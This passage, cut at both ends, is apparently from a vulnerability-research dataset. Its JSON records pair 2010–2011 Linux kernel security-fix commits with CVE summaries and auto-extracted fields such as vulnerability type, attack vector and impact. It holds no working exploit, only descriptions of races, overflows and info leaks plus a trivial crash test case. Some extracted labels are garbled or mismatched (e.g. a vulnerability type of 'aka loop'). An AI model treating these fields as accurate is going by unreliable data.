attacker"},{"commit_id":"2b472611a32a72f4a118c069c2d62a1a3f087afd","cve_id":"CVE-2011-2183","cwe_id":"CWE-362","commit_message":"ksm: fix NULL pointer dereference in scan_get_next_rmap_item()\n\nAndrea Righi reported a case where an exiting task can race against\nksmd::scan_get_next_rmap_item (http:\/\/lkml.org\/lkml\/2011\/6\/1\/742) easily\ntriggering a NULL pointer dereference in ksmd.\n\nksm_scan.mm_slot == &ksm_mm_head with only one registered mm\n\nCPU 1 (__ksm_exit)\t\tCPU 2 (scan_get_next_rmap_item)\n \t\t\t\tlist_empty() is false\nlock\t\t\t\tslot == &ksm_mm_head\nlist_del(slot->mm_list)\n(list now empty)\nunlock\n\t\t\t\tlock\n\t\t\t\tslot = list_entry(slot->mm_list.next)\n\t\t\t\t(list is empty, so slot is still ksm_mm_head)\n\t\t\t\tunlock\n\t\t\t\tslot->mm == NULL ... Oops\n\nClose this race by revalidating that the new slot is not simply the list\nhead again.\n\nAndrea's test case:\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys\/mman.h>\n\n#define BUFSIZE getpagesize()\n\nint main(int argc, char **argv)\n{\n\tvoid *ptr;\n\n\tif (posix_memalign(&ptr, getpagesize(), BUFSIZE) < 0) {\n\t\tperror(\"posix_memalign\");\n\t\texit(1);\n\t}\n\tif (madvise(ptr, BUFSIZE, MADV_MERGEABLE) < 0) {\n\t\tperror(\"madvise\");\n\t\texit(1);\n\t}\n\t*(char *)NULL = 0;\n\n\treturn 0;\n}\n\nReported-by: Andrea Righi <andrea@betterlinux.com>\nTested-by: Andrea Righi <andrea@betterlinux.com>\nCc: Andrea Arcangeli <aarcange@redhat.com>\nSigned-off-by: Hugh Dickins <hughd@google.com>\nSigned-off-by: Chris Wright <chrisw@sous-sol.org>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Race condition in the scan_get_next_rmap_item function in mm\/ksm.c in the Linux kernel before 2.6.39.3, when Kernel SamePage Merging (KSM) is enabled, allows local users to cause a denial of service (NULL pointer dereference) or possibly have unspecified other impact via a crafted application.","commit_message_1":"fix null pointer dereference in scan_get_next_rmap_item ( ) andrea righi reported a case where an exiting task can race against ksmd : :scan_get_next_rmap_item ( http : \/\/<file>\/lkml\/<number>\/<number>\/<number>\/<number> ) easily triggering a null pointer dereference in ksmd","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( pointer dereference ) or possibly have unspecified other impact","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"cae13fe4cc3f24820ffb990c09110626837e85d4","cve_id":"CVE-2011-2182","cwe_id":"CWE-119","commit_message":"Fix for buffer overflow in ldm_frag_add not sufficient\n\nAs Ben Hutchings discovered [1], the patch for CVE-2011-1017 (buffer\noverflow in ldm_frag_add) is not sufficient.  The original patch in\ncommit c340b1d64000 (\"fs\/partitions\/ldm.c: fix oops caused by corrupted\npartition table\") does not consider that, for subsequent fragments,\npreviously allocated memory is used.\n\n[1] http:\/\/lkml.org\/lkml\/2011\/5\/6\/407\n\nReported-by: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: Timo Warns <warns@pre-sense.de>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The ldm_frag_add function in fs\/partitions\/ldm.c in the Linux kernel before 2.6.39.1 does not properly handle memory allocation for non-initial fragments, which might allow local users to conduct buffer overflow attacks, and gain privileges or obtain sensitive information, via a crafted LDM partition table.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-1017.","commit_message_1":"fix for buffer overflow in ldm_frag_add not sufficient a ben hutchings discovered [ <number> ] , the patch for <cve_id> ( buffer overflow in ldm_frag_add ) is not sufficient","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted ldm partition table ","Impact":"conduct buffer overflow attacks , and gain privileges or obtain sensitive information ","Root Cause":"does not properly handle memory allocation for non - initial fragments","Attack Type":"local attacker"},{"commit_id":"64f3b9e203bd06855072e295557dca1485a2ecba","cve_id":"CVE-2011-1927","cwe_id":null,"commit_message":"net: ip_expire() must revalidate route\n\nCommit 4a94445c9a5c (net: Use ip_route_input_noref() in input path)\nadded a bug in IP defragmentation handling, in case timeout is fired.\n\nWhen a frame is defragmented, we use last skb dst field when building\nfinal skb. Its dst is valid, since we are in rcu read section.\n\nBut if a timeout occurs, we take first queued fragment to build one ICMP\nTIME EXCEEDED message. Problem is all queued skb have weak dst pointers,\nsince we escaped RCU critical section after their queueing. icmp_send()\nmight dereference a now freed (and possibly reused) part of memory.\n\nCalling skb_dst_drop() and ip_route_input_noref() to revalidate route is\nthe only possible choice.\n\nReported-by: Denys Fedoryshchenko <denys@visp.net.lb>\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ip_expire function in net\/ipv4\/ip_fragment.c in the Linux kernel before 2.6.39 does not properly construct ICMP_TIME_EXCEEDED packets after a timeout, which allows remote attackers to cause a denial of service (invalid pointer dereference) via crafted fragmented packets.","commit_message_1":"ip_expire ( ) must revalidate route commit 4a94445c9a5c ( net : use ip_route_input_noref ( ) in input path ) added a bug in ip defragmentation handling , in case timeout is fired","Vulnerability Type":"invalid pointer dereference","Attack Vector":"via crafted fragmented packets ","Impact":"cause a denial of service ( invalid pointer dereference )","Root Cause":"does not properly construct icmp _ time _ exceeded packets after a timeout","Attack Type":"remote attacker"},{"commit_id":"764355487ea220fdc2faf128d577d7f679b91f97","cve_id":"CVE-2011-1833","cwe_id":"CWE-264","commit_message":"Ecryptfs: Add mount option to check uid of device being mounted = expect uid\n\nClose a TOCTOU race for mounts done via ecryptfs-mount-private.  The mount\nsource (device) can be raced when the ownership test is done in userspace.\nProvide Ecryptfs a means to force the uid check at mount time.\n\nSigned-off-by: John Johansen <john.johansen@canonical.com>\nCc: <stable@kernel.org>\nSigned-off-by: Tyler Hicks <tyhicks@linux.vnet.ibm.com>","summary":"Race condition in the ecryptfs_mount function in fs\/ecryptfs\/main.c in the eCryptfs subsystem in the Linux kernel before 3.1 allows local users to bypass intended file permissions via a mount.ecryptfs_private mount with a mismatched uid.","commit_message_1":"add mount option to check uid of device being mounted = expect uid close a toctou race for mount done via ecryptfs-mount-private","Vulnerability Type":"Race condition","Attack Vector":"via a mount . ecryptfs _ private mount with a mismatched uid","Impact":"bypass intended file permissions","Root Cause":"caused by a race condition when checking the mount source directory","Attack Type":"local attacker"},{"commit_id":"d5aa407f59f5b83d2c50ec88f5bf56d40f1f8978","cve_id":"CVE-2011-1768","cwe_id":"CWE-362","commit_message":"tunnels: fix netns vs proto registration ordering\n\nSame stuff as in ip_gre patch: receive hook can be called before netns\nsetup is done, oopsing in net_generic().\n\nSigned-off-by: Alexey Dobriyan <adobriyan@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tunnels implementation in the Linux kernel before 2.6.34, when tunnel functionality is configured as a module, allows remote attackers to cause a denial of service (OOPS) by sending a packet during module loading.","commit_message_1":"fix netns v proto registration ordering same stuff a in ip_gre patch : receive hook can be called before netns setup is done , oopsing in net_generic ( )","Vulnerability Type":"Race Condition","Attack Vector":"by sending a packet during module loading","Impact":"cause a denial of service ( oops )","Root Cause":"caused by the invoking of the GRE protocol receive hook before the tunnel is initialized","Attack Type":"remote attacker"},{"commit_id":"c2892f02712e9516d72841d5c019ed6916329794","cve_id":"CVE-2011-1767","cwe_id":null,"commit_message":"gre: fix netns vs proto registration ordering\n\nGRE protocol receive hook can be called right after protocol addition is done.\nIf netns stuff is not yet initialized, we're going to oops in\nnet_generic().\n\nThis is remotely oopsable if ip_gre is compiled as module and packet\ncomes at unfortunate moment of module loading.\n\nSigned-off-by: Alexey Dobriyan <adobriyan@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/ipv4\/ip_gre.c in the Linux kernel before 2.6.34, when ip_gre is configured as a module, allows remote attackers to cause a denial of service (OOPS) by sending a packet during module loading.","commit_message_1":"fix netns v proto registration ordering gre protocol receive hook can be called right after protocol addition is done","Vulnerability Type":"OOPS","Attack Vector":"by sending a packet during module loading","Impact":"cause a denial of service ( oops )","Root Cause":"is configured as a module","Attack Type":"remote attacker"},{"commit_id":"0f22072ab50cac7983f9660d33974b45184da4f9","cve_id":"CVE-2011-1759","cwe_id":"CWE-189","commit_message":"ARM: 6891\/1: prevent heap corruption in OABI semtimedop\n\nWhen CONFIG_OABI_COMPAT is set, the wrapper for semtimedop does not\nbound the nsops argument.  A sufficiently large value will cause an\ninteger overflow in allocation size, followed by copying too much data\ninto the allocated buffer.  Fix this by restricting nsops to SEMOPM.\nUntested.\n\nCc: stable@kernel.org\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nSigned-off-by: Russell King <rmk+kernel@arm.linux.org.uk>","summary":"Integer overflow in the sys_oabi_semtimedop function in arch\/arm\/kernel\/sys_oabi-compat.c in the Linux kernel before 2.6.39 on the ARM platform, when CONFIG_OABI_COMPAT is enabled, allows local users to gain privileges or cause a denial of service (heap memory corruption) by providing a crafted argument and leveraging a race condition.","commit_message_1":"<number>\/<number> : prevent heap corruption in oabi semtimedop when config_oabi_compat is set , the wrapper for semtimedop doe not bound the nsops argument","Vulnerability Type":"integer overflow","Attack Vector":"caused by improper bounds checking by the semtimedop OABI wrapper","Impact":"gain privileges or cause a denial of service ( heap memory corruption )","Root Cause":"when config _ oabi _ compat is enabled","Attack Type":"local attacker"},{"commit_id":"d0de4dc584ec6aa3b26fffea320a8457827768fc","cve_id":"CVE-2011-1479","cwe_id":"CWE-399","commit_message":"inotify: fix double free\/corruption of stuct user\n\nOn an error path in inotify_init1 a normal user can trigger a double\nfree of struct user.  This is a regression introduced by a2ae4cc9a16e\n(\"inotify: stop kernel memory leak on file creation failure\").\n\nWe fix this by making sure that if a group exists the user reference is\ndropped when the group is cleaned up.  We should not explictly drop the\nreference on error and also drop the reference when the group is cleaned\nup.\n\nThe new lifetime rules are that an inotify group lives from\ninotify_new_group to the last fsnotify_put_group.  Since the struct user\nand inotify_devs are directly tied to this lifetime they are only\nchanged\/updated in those two locations.  We get rid of all special\ncasing of struct user or user->inotify_devs.\n\nSigned-off-by: Eric Paris <eparis@redhat.com>\nCc: stable@kernel.org (2.6.37 and up)\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Double free vulnerability in the inotify subsystem in the Linux kernel before 2.6.39 allows local users to cause a denial of service (system crash) via vectors involving failed attempts to create files.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2010-4250.","commit_message_1":"fix double free\/corruption of stuct user on an error path in inotify_init1 a normal user can trigger a double free of struct user","Vulnerability Type":"double free","Attack Vector":"via vectors involving failed attempts to create files","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by a double-free error","Attack Type":"local attacker"},{"commit_id":"4d00135a680727f6c3be78f8befaac009030e4df","cve_id":"CVE-2011-1477","cwe_id":"CWE-119","commit_message":"sound\/oss\/opl3: validate voice and channel indexes\n\nUser-controllable indexes for voice and channel values may cause reading\nand writing beyond the bounds of their respective arrays, leading to\npotentially exploitable memory corruption.  Validate these indexes.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: stable@kernel.org\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"Multiple array index errors in sound\/oss\/opl3.c in the Linux kernel before 2.6.39 allow local users to cause a denial of service (heap memory corruption) or possibly gain privileges by leveraging write access to \/dev\/sequencer.","commit_message_1":"validate voice and channel index user-controllable index for voice and channel value may cause reading and writing beyond the bound of their respective array , leading to potentially exploitable memory corruption","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging write access to \/ dev \/ sequencer","Impact":"cause a denial of service ( heap memory corruption ) or possibly gain privileges","Root Cause":"caused by multiple array index errors","Attack Type":"local attacker"},{"commit_id":"b769f49463711205d57286e64cf535ed4daf59e9","cve_id":"CVE-2011-1476","cwe_id":"CWE-189","commit_message":"sound\/oss: remove offset from load_patch callbacks\n\nWas: [PATCH] sound\/oss\/midi_synth: prevent underflow, use of\nuninitialized value, and signedness issue\n\nThe offset passed to midi_synth_load_patch() can be essentially\narbitrary.  If it's greater than the header length, this will result in\na copy_from_user(dst, src, negative_val).  While this will just return\n-EFAULT on x86, on other architectures this may cause memory corruption.\nAdditionally, the length field of the sysex_info structure may not be\ninitialized prior to its use.  Finally, a signed comparison may result\nin an unintentionally large loop.\n\nOn suggestion by Takashi Iwai, version two removes the offset argument\nfrom the load_patch callbacks entirely, which also resolves similar\nissues in opl3.  Compile tested only.\n\nv3 adjusts comments and hopefully gets copy offsets right.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"Integer underflow in the Open Sound System (OSS) subsystem in the Linux kernel before 2.6.39 on unspecified non-x86 platforms allows local users to cause a denial of service (memory corruption) by leveraging write access to \/dev\/sequencer.","commit_message_1":"remove offset from load_patch callback wa : [ patch ] sound\/oss\/midi_synth : prevent underflow , use of uninitialized value , and signedness issue the offset passed to midi_synth_load_patch ( ) can be essentially arbitrary","Vulnerability Type":"integer underflow","Attack Vector":"by leveraging write access to \/ dev \/ sequencer","Impact":"cause a denial of service ( memory corruption )","Root Cause":"caused by an integer underflow","Attack Type":"local attacker"},{"commit_id":"1309d7afbed112f0e8e90be9af975550caa0076b","cve_id":"CVE-2011-1160","cwe_id":"CWE-200","commit_message":"char\/tpm: Fix unitialized usage of data buffer\n\nThis patch fixes information leakage to the userspace by initializing\nthe data buffer to zero.\n\nReported-by: Peter Huewe <huewe.external@infineon.com>\nSigned-off-by: Peter Huewe <huewe.external@infineon.com>\nSigned-off-by: Marcel Selhorst <m.selhorst@sirrix.com>\n[ Also removed the silly \"* sizeof(u8)\".  If that isn't 1, we have way\n  deeper problems than a simple multiplication can fix.   - Linus ]\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The tpm_open function in drivers\/char\/tpm\/tpm.c in the Linux kernel before 2.6.39 does not initialize a certain buffer, which allows local users to obtain potentially sensitive information from kernel memory via unspecified vectors.","commit_message_1":"fix unitialized usage of data buffer this patch fix information leakage to the userspace by initializing the data buffer to zero","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via unspecified vectors","Impact":"obtain potentially sensitive information from kernel memory","Root Cause":"does not initialize a certain buffer","Attack Type":"local attacker"},{"commit_id":"d846f71195d57b0bbb143382647c2c6638b04c5a","cve_id":"CVE-2011-1080","cwe_id":"CWE-20","commit_message":"bridge: netfilter: fix information leak\n\nStruct tmp is copied from userspace.  It is not checked whether the \"name\"\nfield is NULL terminated.  This may lead to buffer overflow and passing\ncontents of kernel stack as a module name to try_then_request_module() and,\nconsequently, to modprobe commandline.  It would be seen by all userspace\nprocesses.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Patrick McHardy <kaber@trash.net>","summary":"The do_replace function in net\/bridge\/netfilter\/ebtables.c in the Linux kernel before 2.6.39 does not ensure that a certain name field ends with a '0' character, which allows local users to obtain potentially sensitive information from kernel stack memory by leveraging the CAP_NET_ADMIN capability to replace a table, and then reading a modprobe command line.","commit_message_1":"netfilter : fix information leak struct tmp is copied from userspace","Vulnerability Type":"Improper Input Validation","Attack Vector":"by leveraging the cap _ net _ admin capability to replace a table , and then reading a modprobe command line","Impact":"obtain potentially sensitive information from kernel stack memory","Root Cause":"does not ensure that a certain name field ends with a ' 0 ' character","Attack Type":"local attacker"},{"commit_id":"43629f8f5ea32a998d06d1bb41eefa0e821ff573","cve_id":"CVE-2011-1079","cwe_id":"CWE-20","commit_message":"Bluetooth: bnep: fix buffer overflow\n\nStruct ca is copied from userspace.  It is not checked whether the \"device\"\nfield is NULL terminated.  This potentially leads to BUG() inside of\nalloc_netdev_mqs() and\/or information leak by creating a device with a name\nmade of contents of kernel stack.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Gustavo F. Padovan <padovan@profusion.mobi>","summary":"The bnep_sock_ioctl function in net\/bluetooth\/bnep\/sock.c in the Linux kernel before 2.6.39 does not ensure that a certain device field ends with a '0' character, which allows local users to obtain potentially sensitive information from kernel stack memory, or cause a denial of service (BUG and system crash), via a BNEPCONNADD command.","commit_message_1":"bnep : fix buffer overflow struct ca is copied from userspace","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a bnepconnadd command","Impact":"obtain potentially sensitive information from kernel stack memory , or cause a denial of service ( bug and system crash )","Root Cause":"does not ensure that a certain device field ends with a ' 0 ' character","Attack Type":"local attacker"},{"commit_id":"c4c896e1471aec3b004a693c689f60be3b17ac86","cve_id":"CVE-2011-1078","cwe_id":"CWE-200","commit_message":"Bluetooth: sco: fix information leak to userspace\n\nstruct sco_conninfo has one padding byte in the end.  Local variable\ncinfo of type sco_conninfo is copied to userspace with this uninizialized\none byte, leading to old stack contents leak.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Gustavo F. Padovan <padovan@profusion.mobi>","summary":"The sco_sock_getsockopt_old function in net\/bluetooth\/sco.c in the Linux kernel before 2.6.39 does not initialize a certain structure, which allows local users to obtain potentially sensitive information from kernel stack memory via the SCO_CONNINFO option.","commit_message_1":"sco : fix information leak to userspace struct sco_conninfo ha one padding byte in the end","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via the sco _ conninfo option","Impact":"obtain potentially sensitive information from kernel stack memory","Root Cause":"does not initialize a certain structure","Attack Type":"local attacker"},{"commit_id":"6094628bfd94323fc1cea05ec2c6affd98c18f7f","cve_id":"CVE-2011-1023","cwe_id":null,"commit_message":"rds: prevent BUG_ON triggering on congestion map updates\n\nRecently had this bug halt reported to me:\n\nkernel BUG at net\/rds\/send.c:329!\nOops: Exception in kernel mode, sig: 5 [#1]\nSMP NR_CPUS=1024 NUMA pSeries\nModules linked in: rds sunrpc ipv6 dm_mirror dm_region_hash dm_log ibmveth sg\next4 jbd2 mbcache sd_mod crc_t10dif ibmvscsic scsi_transport_srp scsi_tgt\ndm_mod [last unloaded: scsi_wait_scan]\nNIP: d000000003ca68f4 LR: d000000003ca67fc CTR: d000000003ca8770\nREGS: c000000175cab980 TRAP: 0700   Not tainted  (2.6.32-118.el6.ppc64)\nMSR: 8000000000029032 <EE,ME,CE,IR,DR>  CR: 44000022  XER: 00000000\nTASK = c00000017586ec90[1896] 'krdsd' THREAD: c000000175ca8000 CPU: 0\nGPR00: 0000000000000150 c000000175cabc00 d000000003cb7340 0000000000002030\nGPR04: ffffffffffffffff 0000000000000030 0000000000000000 0000000000000030\nGPR08: 0000000000000001 0000000000000001 c0000001756b1e30 0000000000010000\nGPR12: d000000003caac90 c000000000fa2500 c0000001742b2858 c0000001742b2a00\nGPR16: c0000001742b2a08 c0000001742b2820 0000000000000001 0000000000000001\nGPR20: 0000000000000040 c0000001742b2814 c000000175cabc70 0800000000000000\nGPR24: 0000000000000004 0200000000000000 0000000000000000 c0000001742b2860\nGPR28: 0000000000000000 c0000001756b1c80 d000000003cb68e8 c0000001742b27b8\nNIP [d000000003ca68f4] .rds_send_xmit+0x4c4\/0x8a0 [rds]\nLR [d000000003ca67fc] .rds_send_xmit+0x3cc\/0x8a0 [rds]\nCall Trace:\n[c000000175cabc00] [d000000003ca67fc] .rds_send_xmit+0x3cc\/0x8a0 [rds]\n(unreliable)\n[c000000175cabd30] [d000000003ca7e64] .rds_send_worker+0x54\/0x100 [rds]\n[c000000175cabdb0] [c0000000000b475c] .worker_thread+0x1dc\/0x3c0\n[c000000175cabed0] [c0000000000baa9c] .kthread+0xbc\/0xd0\n[c000000175cabf90] [c000000000032114] .kernel_thread+0x54\/0x70\nInstruction dump:\n4bfffd50 60000000 60000000 39080001 935f004c f91f0040 41820024 813d017c\n7d094a78 7d290074 7929d182 394a0020 <0b090000> 40e2ff68 4bffffa4 39200000\nKernel panic - not syncing: Fatal exception\nCall Trace:\n[c000000175cab560] [c000000000012e04] .show_stack+0x74\/0x1c0 (unreliable)\n[c000000175cab610] [c0000000005a365c] .panic+0x80\/0x1b4\n[c000000175cab6a0] [c00000000002fbcc] .die+0x21c\/0x2a0\n[c000000175cab750] [c000000000030000] ._exception+0x110\/0x220\n[c000000175cab910] [c000000000004b9c] program_check_common+0x11c\/0x180\n\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Reliable Datagram Sockets (RDS) subsystem in the Linux kernel before 2.6.38 does not properly handle congestion map updates, which allows local users to cause a denial of service (BUG_ON and system crash) via vectors involving (1) a loopback (aka loop) transmit operation or (2) an InfiniBand (aka ib) transmit operation.","commit_message_1":"prevent bug_on triggering on congestion map update recently had this bug halt reported to me : kernel bug at net\/rds\/<file> : <number> ! oops : exception in kernel mode , sig : <number> [ # <number> ] smp nr_cpus=<number> numa pseries module linked in : rds sunrpc ipv6 dm_mirror dm_region_hash dm_log ibmveth sg ext4 jbd2 mbcache sd_mod crc_t10dif ibmvscsic scsi_transport_srp scsi_tgt dm_mod [ last unloaded : scsi_wait_scan ] nip : d000000003ca68f4 lr : d000000003ca67fc ctr : d000000003ca8770 regs : c000000175cab980 trap : <number> not tainted ( <file>","Vulnerability Type":"aka loop","Attack Vector":"via vectors involving ( 1 ) a loopback ( aka loop ) transmit operation or ( 2 ) an infiniband ( aka ib ) transmit operation","Impact":"cause a denial of service ( bug _ on and system crash )","Root Cause":"does not properly handle congestion map updates","Attack Type":"local attacker"},{"commit_id":"526b4af47f44148c9d665e57723ed9f86634c6e3","cve_id":"CVE-2011-1021","cwe_id":"CWE-264","commit_message":"ACPI: Split out custom_method functionality into an own driver\n\nWith \/sys\/kernel\/debug\/acpi\/custom_method root can write\nto arbitrary memory and increase his priveleges, even if\nthese are restricted.\n\n-> Make this an own debug .config option and warn about the\nsecurity issue in the config description.\n\n-> Still keep acpi\/debugfs.c which now only creates an empty\n   \/sys\/kernel\/debug\/acpi directory. There might be other\n   users of it later.\n\nSigned-off-by: Thomas Renninger <trenn@suse.de>\nAcked-by: Rafael J. Wysocki <rjw@sisk.pl>\nAcked-by: rui.zhang@intel.com\nSigned-off-by: Len Brown <len.brown@intel.com>","summary":"drivers\/acpi\/debugfs.c in the Linux kernel before 3.0 allows local users to modify arbitrary kernel memory locations by leveraging root privileges to write to the \/sys\/kernel\/debug\/acpi\/custom_method file. NOTE: this vulnerability exists because of an incomplete fix for CVE-2010-4347.","commit_message_1":"split out custom_method functionality into an own driver with \/sys\/kernel\/debug\/acpi\/custom_method root can write to arbitrary memory and increase his priveleges , even if these are restricted","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging root privileges to write to the \/ sys \/ kernel \/ debug \/ acpi \/ custom _ method file","Impact":"modify arbitrary kernel memory locations","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"6b0d6a9b4296fa16a28d10d416db7a770fc03287","cve_id":"CVE-2011-0716","cwe_id":"CWE-399","commit_message":"bridge: Fix mglist corruption that leads to memory corruption\n\nThe list mp->mglist is used to indicate whether a multicast group\nis active on the bridge interface itself as opposed to one of the\nconstituent interfaces in the bridge.\n\nUnfortunately the operation that adds the mp->mglist node to the\nlist neglected to check whether it has already been added.  This\nleads to list corruption in the form of nodes pointing to itself.\n\nNormally this would be quite obvious as it would cause an infinite\nloop when walking the list.  However, as this list is never actually\nwalked (which means that we don't really need it, I'll get rid of\nit in a subsequent patch), this instead is hidden until we perform\na delete operation on the affected nodes.\n\nAs the same node may now be pointed to by more than one node, the\ndelete operations can then cause modification of freed memory.\n\nThis was observed in practice to cause corruption in 512-byte slabs,\nmost commonly leading to crashes in jbd2.\n\nThanks to Josef Bacik for pointing me in the right direction.\n\nReported-by: Ian Page Hands <ihands@redhat.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The br_multicast_add_group function in net\/bridge\/br_multicast.c in the Linux kernel before 2.6.38, when a certain Ethernet bridge configuration is used, allows local users to cause a denial of service (memory corruption and system crash) by sending IGMP packets to a local interface.","commit_message_1":"fix mglist corruption that lead to memory corruption the list mp- > mglist is used to indicate whether a multicast group is active on the bridge interface itself a opposed to one of the constituent interface in the bridge","Vulnerability Type":"Resource Management Errors","Attack Vector":"by sending igmp packets to a local interface ","Impact":"cause a denial of service ( memory corruption and system crash )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"867c20265459d30a01b021a9c1e81fb4c5832aa9","cve_id":"CVE-2011-0006","cwe_id":"CWE-264","commit_message":"ima: fix add LSM rule bug\n\nIf security_filter_rule_init() doesn't return a rule, then not everything\nis as fine as the return code implies.\n\nThis bug only occurs when the LSM (eg. SELinux) is disabled at runtime.\n\nAdding an empty LSM rule causes ima_match_rules() to always succeed,\nignoring any remaining rules.\n\n default IMA TCB policy:\n  # PROC_SUPER_MAGIC\n  dont_measure fsmagic=0x9fa0\n  # SYSFS_MAGIC\n  dont_measure fsmagic=0x62656572\n  # DEBUGFS_MAGIC\n  dont_measure fsmagic=0x64626720\n  # TMPFS_MAGIC\n  dont_measure fsmagic=0x01021994\n  # SECURITYFS_MAGIC\n  dont_measure fsmagic=0x73636673\n\n  < LSM specific rule >\n  dont_measure obj_type=var_log_t\n\n  measure func=BPRM_CHECK\n  measure func=FILE_MMAP mask=MAY_EXEC\n  measure func=FILE_CHECK mask=MAY_READ uid=0\n\nThus without the patch, with the boot parameters 'tcb selinux=0', adding\nthe above 'dont_measure obj_type=var_log_t' rule to the default IMA TCB\nmeasurement policy, would result in nothing being measured.  The patch\nprevents the default TCB policy from being replaced.\n\nSigned-off-by: Mimi Zohar <zohar@us.ibm.com>\nCc: James Morris <jmorris@namei.org>\nAcked-by: Serge Hallyn <serge.hallyn@canonical.com>\nCc: David Safford <safford@watson.ibm.com>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The ima_lsm_rule_init function in security\/integrity\/ima\/ima_policy.c in the Linux kernel before 2.6.37, when the Linux Security Modules (LSM) framework is disabled, allows local users to bypass Integrity Measurement Architecture (IMA) rules in opportunistic circumstances by leveraging an administrator's addition of an IMA rule for LSM.","commit_message_1":"fix add lsm rule bug if security_filter_rule_init ( ) doe n't return a rule , then not everything is a fine a the return code implies","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging an administrator ' s addition of an ima rule for lsm ","Impact":"bypass integrity measurement architecture ( ima ) rules in opportunistic circumstances","Root Cause":"when the Linux Security Modules (LSM) framework is disabled","Attack Type":"local attacker"},{"commit_id":"7572777eef78ebdee1ecb7c258c0ef94d35bad16","cve_id":"CVE-2010-4650","cwe_id":"CWE-119","commit_message":"fuse: verify ioctl retries\n\nVerify that the total length of the iovec returned in FUSE_IOCTL_RETRY\ndoesn't overflow iov_length().\n\nSigned-off-by: Miklos Szeredi <mszeredi@suse.cz>\nCC: Tejun Heo <tj@kernel.org>\nCC: <stable@kernel.org>         [2.6.31+]","summary":"Buffer overflow in the fuse_do_ioctl function in fs\/fuse\/file.c in the Linux kernel before 2.6.37 allows local users to cause a denial of service or possibly have unspecified other impact by leveraging the ability to operate a CUSE server.","commit_message_1":"verify ioctl retries verify that the total length of the iovec returned in fuse_ioctl_retry doe n't overflow iov_length ( )","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging the ability to operate a cuse server","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by improper length validation of the iovec returned","Attack Type":"local attacker"},{"commit_id":"0a54917c3fc295cb61f3fb52373c173fd3b69f48","cve_id":"CVE-2010-4648","cwe_id":null,"commit_message":"orinoco: fix TKIP countermeasure behaviour\n\nEnable the port when disabling countermeasures, and disable it on\nenabling countermeasures.\n\nThis bug causes the response of the system to certain attacks to be\nineffective.\n\nIt also prevents wpa_supplicant from getting scan results, as\nwpa_supplicant disables countermeasures on startup - preventing the\nhardware from scanning.\n\nwpa_supplicant works with ap_mode=2 despite this bug because the commit\nhandler re-enables the port.\n\nThe log tends to look like:\n\nState: DISCONNECTED -> SCANNING\nStarting AP scan for wildcard SSID\nScan requested (ret=0) - scan timeout 5 seconds\nEAPOL: disable timer tick\nEAPOL: Supplicant port status: Unauthorized\nScan timeout - try to get results\nFailed to get scan results\nFailed to get scan results - try scanning again\nSetting scan request: 1 sec 0 usec\nStarting AP scan for wildcard SSID\nScan requested (ret=-1) - scan timeout 5 seconds\nFailed to initiate AP scan.\n\nReported by: Giacomo Comes <comes@naic.edu>\nSigned-off by: David Kilroy <kilroyd@googlemail.com>\nCc: stable@kernel.org\nSigned-off-by: John W. Linville <linville@tuxdriver.com>","summary":"The orinoco_ioctl_set_auth function in drivers\/net\/wireless\/orinoco\/wext.c in the Linux kernel before 2.6.37 does not properly implement a TKIP protection mechanism, which makes it easier for remote attackers to obtain access to a Wi-Fi network by reading Wi-Fi frames.","commit_message_1":"fix tkip countermeasure behaviour enable the port when disabling countermeasure , and disable it on enabling countermeasure","Vulnerability Type":"unspecified","Attack Vector":"by reading wi - fi frames","Impact":"obtain access to a wi - fi network","Root Cause":"does not properly implement a tkip protection mechanism","Attack Type":"remote attacker"},{"commit_id":"a2ae4cc9a16e211c8a128ba10d22a85431f093ab","cve_id":"CVE-2010-4250","cwe_id":"CWE-399","commit_message":"inotify: stop kernel memory leak on file creation failure\n\nIf inotify_init is unable to allocate a new file for the new inotify\ngroup we leak the new group.  This patch drops the reference on the\ngroup on file allocation failure.\n\nReported-by: Vegard Nossum 